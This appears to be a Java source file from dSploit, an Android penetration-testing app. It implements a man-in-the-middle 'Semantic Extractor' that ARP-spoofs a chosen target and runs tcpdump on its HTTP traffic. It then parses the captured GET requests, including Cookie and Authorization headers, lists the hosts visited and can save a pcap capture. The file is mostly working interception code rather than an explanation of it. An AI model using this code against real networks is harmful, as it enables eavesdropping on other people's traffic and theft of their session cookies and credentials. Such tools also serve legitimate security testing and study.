package it.evilsocket.dsploit.plugins.mitm;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.core.Shell.OutputReceiver;
import it.evilsocket.dsploit.gui.dialogs.ConfirmDialog;
import it.evilsocket.dsploit.gui.dialogs.ConfirmDialog.ConfirmDialogListener;
import it.evilsocket.dsploit.plugins.mitm.SpoofSession.OnSessionReadyListener;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.TextView;

import com.actionbarsherlock.app.SherlockActivity;
import com.actionbarsherlock.view.MenuItem;




public class Extractor extends SherlockActivity {

	
	
		private static String[] httpRequestHeaders={"GET / HTTP/1.1","Accept","Accept-Charset","Accept-Encoding","Accept-Language","Accept-Datetime",
				"Authorization","Cache-Control","Connection","Cookie","Content-Length","Content-MD5","Content-Type","Date",
				"Expect","From","Host","If-Match","If-Modified-Since","If-None-Match","If-Range","If-Unmodified-Since",	
				"Max-Forwards","Origin","Pragma","Proxy-Authorization","Range","Referer","TE","Upgrade","User-Agent","Via","Warning"};
		
		private static boolean listenning			=false;
		private	static  String PCAP_TARGET_FILTER	="";
		private static String targetIP				="";
		private static String targetMac				="";
		private static SpoofSession session			=null;
		
		private static HttpGETListAdapter GETreqListAdapter=null;
		private TextView IPAddress					=null;
		private TextView MacAddress					=null;
		private TextView targetUserAgent			=null;
		private ListView HTTPGetsList				=null;
	
		private static String PCAP_FILE_NAME		=null;
		
		public static class HttpGetReq{
			
			HashMap<String, String> requestData;
			boolean hasCookies;
			int numberOfVisits;
			
			public HttpGetReq(){
			
			}

		}

		
		public static class HttpGETListAdapter extends ArrayAdapter<HttpGetReq>{

			static Context adapterContext					=null;
			static int layout_id;
			static ArrayList<HttpGetReq> list				=null;
			
			static class ListElementHolder{
				
				ImageView favicon;
				TextView host;
				
			}
			
			
			public static int getFavIcon(String host){

				return R.drawable.favicon_facebook;
			}
			
			public HttpGETListAdapter(Context context, int layout) {
				super(context, layout);
				adapterContext=context;
				layout_id=layout;
				list=new ArrayList<HttpGetReq>();
			}

			public synchronized HttpGetReq getItem(int index){
				
				return list.get(index);
			}
			
			public synchronized  void addItem(HttpGetReq req){
				boolean found=false;
				
				for(HttpGetReq listRequest:list){
					if(listRequest.requestData.get("Host").equals(req.requestData.get("Host"))){
						found=true;
						break;
					}
				}
				
				if(!found){
					list.add(req);
					//Log.d("","item added");
				}
				
			}
			public int getCount(){
				return list.size();
			}

			@Override
			public View getView(int position, View convertView, ViewGroup parent) {
				View listElement =convertView;
				ListElementHolder holder;
				
				if(listElement==null){
					LayoutInflater inflater=(LayoutInflater) adapterContext.getApplicationContext().getSystemService(LAYOUT_INFLATER_SERVICE);
					listElement=inflater.inflate(layout_id, null,false);
					
					holder=new ListElementHolder();
					holder.favicon=(ImageView)listElement.findViewById(R.id.req_favicon);
					holder.host=(TextView)listElement.findViewById(R.id.req_host);
					
					listElement.setTag(holder);
					
					
					
				}else{
					holder=(ListElementHolder)listElement.getTag();
							
					
				}
					//holder.favicon.setImageResource(getFavIcon(""));
				holder.host.setText(list.get(position).requestData.get("Host"));
				
				
				return listElement;
			}
			
			
			
			
		}
		
		
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.extractor_layout);
		setTitle( System.getCurrentTarget() + " > MITM > Semantic Extractor" );
		getSupportActionBar().setDisplayHomeAsUpEnabled(true);
		
		//retrieve the target data
			
		targetIP=getIntent().getExtras().getString("target_IP");
		targetMac=getIntent().getExtras().getString("target_MAC");
		
		PCAP_TARGET_FILTER=" -nnA src host "+targetIP+" and dst port 80";
		Log.d("",PCAP_TARGET_FILTER);
		
		IPAddress=(TextView)findViewById(R.id.ExtTargetIP);
		MacAddress=(TextView)findViewById(R.id.ExtTargetMac);
		targetUserAgent=(TextView)findViewById(R.id.ExtTargetUserAgent);
		HTTPGetsList=(ListView)findViewById(R.id.httpGETlist);
		
		IPAddress.setText(IPAddress.getText()+targetIP);
		MacAddress.setText(MacAddress.getText()+targetMac);
		
		GETreqListAdapter=new HttpGETListAdapter(getApplicationContext(), R.layout.getreq_list_item);
		HTTPGetsList.setAdapter(GETreqListAdapter);
		
		session=new SpoofSession(false, false, null, null);

		
		new ConfirmDialog("save the file","Want to save a .pcap file?", this, new ConfirmDialogListener() {
			
			@Override
			public void onConfirm() {
				// TODO Auto-generated method stub
				PCAP_FILE_NAME = ( new File( System.getStoragePath(), "dsploit-sniff-" + java.lang.System.currentTimeMillis() + ".pcap" ) ).getAbsolutePath();				
				startCapturing();
			}
			
			@Override
			public void onCancel() {
				// TODO Auto-generated method stub
				startCapturing();
			}
		}).show();
		
		
	}

	
	private void startCapturing() {		
		//if the re is a tcpdump session alive, we first kill it
		System.getTcpDump().kill();

			session.start( new OnSessionReadyListener() {			
			@Override
			public void onError( String error ) {

			}

			public void onSessionReady() {
				

				System.getTcpDump().sniff( PCAP_TARGET_FILTER, PCAP_FILE_NAME, new OutputReceiver(){
					
					String req="";
					boolean foundGET=false;
					
					
					public void onStart(String command) { }

					
					public void onNewLine( String line ) {
						//Log.i("WARNING	",line);
						try
						{
							
							//tcpdump exit contains an http request field
						if(containsHTTPRequestHeaderField(line)){
								//if contains GET is the beginning of a new request
							if(line.contains("GET / HTTP/1.1") && foundGET){
															
								//if the request is empty and we found GET again it means we are on a new Request
								if(!req.isEmpty()){
									
									Log.d("","Fin Request");
									req+="#";
									Extractor.this.runOnUiThread(new Runnable(){
										HashMap<String,String> fieldsMap=null;
										public void run() {
										fieldsMap=requestToHashMap(req);	
										HttpGetReq req=new HttpGetReq();
										req.requestData=fieldsMap;
										
										GETreqListAdapter.addItem(req);
										GETreqListAdapter.notifyDataSetChanged();
										
										}
										
									});
									
									
									foundGET=false;
								}
								
								
							
								
							} if(line.contains("GET / HTTP/1.1") && !foundGET){
								foundGET=true;//->foundGet set to true	
								line=line.substring(line.indexOf("GET / HTTP/1.1"), line.length());
								req="";
								req+=line;
							}else if(foundGET){
								req+="#"+line;
							}
							
							
						}
							
								
							
						
						}
						catch( Exception e )
						{
							System.errorLogging( "Error during packet capturing", e );
						}
					}

					@Override
					public void onEnd(int exitCode) { }
				}).start();				
			}
		});
	

	}
public static void printhashmap(HashMap<String, String> map){
	
	int i=1;
	for(String key: map.keySet()){
		Log.d("DEBUG",i+" "+key+":"+map.get(key));
		i++;
	}
	
	
}
	
	public static HashMap<String, String> requestToHashMap(String req){
		HashMap<String,String> map=new HashMap<String, String>();
		String[] data;
		//String filed="";
		//String value="";
		data=req.split("#");
		int i=1;
		for(String line: data){
			
			for(String headerField: httpRequestHeaders){
				
				if(line.contains(headerField) && !headerField.equals("GET / HTTP/1.1")){
					
					map.put(headerField, line.replace(headerField+": ", ""));
					i++;
				}
				
			}	
		}
		return map;
	}
	
	public static boolean containsHTTPRequestHeaderField(String input){
		boolean found =false;
		
		for(String headerField: httpRequestHeaders){
			if(input.contains(headerField)){
				found=true;
				break;
			}
			
		}
		return found;
	}
	
	/*
	 * 
	 * this two methods do the same:
	 * 
	 * ->onOptionsItemSelected takes you to the parent activity when actionBar arrow is pressed
	 * 
	 * ->onbackPressed does the same but when  the back button on the device is pressed
	 * 
	 * @see com.actionbarsherlock.app.SherlockActivity#onOptionsItemSelected(android.view.MenuItem)
	 */
	
	public boolean onOptionsItemSelected( MenuItem item ) 
	{    
		switch( item.getItemId() ) 
		{        
			case android.R.id.home:            
	         
				onBackPressed();
				
				return true;
	    	  
			default:            
				return super.onOptionsItemSelected(item);    
	   }
	}
	
	public void onBackPressed() {
	    super.onBackPressed();
	    overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);	    	    
	}
}

